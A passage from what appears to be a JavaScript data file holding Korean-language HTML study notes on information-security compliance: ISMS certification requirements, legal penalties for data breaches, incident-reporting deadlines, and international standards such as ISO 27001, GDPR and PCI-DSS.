    <tr><td>인증 기관</td><td>KISA (한국인터넷진흥원)</td><td>KISA</td></tr>
    <tr><td>유효 기간</td><td>3년 (매년 사후심사)</td><td>3년 (매년 사후심사)</td></tr>
  </tbody>
</table>

<h4>ISMS 의무 인증 대상</h4>
<ul>
  <li><strong>ISP</strong>: 기간통신사업자 (KT, SKT, LGU+ 등)</li>
  <li><strong>IDC</strong>: 인터넷데이터센터</li>
  <li><strong>정보통신서비스 제공자</strong>: 연간 매출액 100억 원 이상 또는 전년도 말 일일평균 이용자 수 100만 명 이상</li>
  <li><strong>병원</strong>: 전년도 말 일일평균 이용자 수 100만 명 이상</li>
</ul>

<h3>주요 처벌 기준</h3>
<table>
  <thead><tr><th>위반 내용</th><th>처벌</th></tr></thead>
  <tbody>
    <tr><td>개인정보 유출·침해 (개인정보보호법)</td><td>5년 이하 징역 또는 5천만원 이하 벌금</td></tr>
    <tr><td>주민등록번호 암호화 미적용</td><td>과태료 3천만원 이하</td></tr>
    <tr><td>안전조치 의무 위반</td><td>과태료 3천만원 이하</td></tr>
    <tr><td>개인정보 처리방침 미공개</td><td>과태료 1천만원 이하</td></tr>
    <tr><td>해킹 등 침해사고 (정보통신망법)</td><td>5년 이하 징역 또는 5천만원 이하 벌금</td></tr>
    <tr><td>스팸 전송</td><td>3천만원 이하 과태료</td></tr>
  </tbody>
</table>

<h3>침해사고 대응</h3>
<ul>
  <li><strong>침해사고 신고 의무</strong>: 정보통신서비스 제공자는 침해사고 발생 시 <strong>24시간 이내</strong> KISA에 신고.</li>
  <li><strong>개인정보 유출 통지 의무</strong>: 정보주체에게 <strong>72시간 이내</strong> 통지. 1천 명 이상 유출 시 행정안전부·개인정보보호위원회 신고.</li>
  <li><strong>CERT (Computer Emergency Response Team)</strong>: 침해사고 대응 전담 조직.</li>
  <li><strong>KISA 인터넷침해대응센터</strong>: 국가 차원 침해사고 대응.</li>
</ul>

<h3>국제 표준 및 규정</h3>
<ul>
  <li><strong>ISO/IEC 27001</strong>: 정보보호 관리체계 국제 표준. ISMS의 국제판.</li>
  <li><strong>ISO/IEC 27002</strong>: 정보보호 통제 항목 실무 가이드.</li>
  <li><strong>GDPR (EU 일반 데이터 보호 규정)</strong>: EU 시민 개인정보 보호. 위반 시 전 세계 매출의 4% 또는 2천만 유로 중 높은 금액.</li>
  <li><strong>PCI-DSS</strong>: 카드사 공동 결제 보안 기준. 신용카드 정보 처리 시 준수.</li>
  <li><strong>NIST CSF</strong>: 미국 사이버보안 프레임워크. 식별-보호-탐지-대응-복구.</li>
</ul>
    `,
  },
];
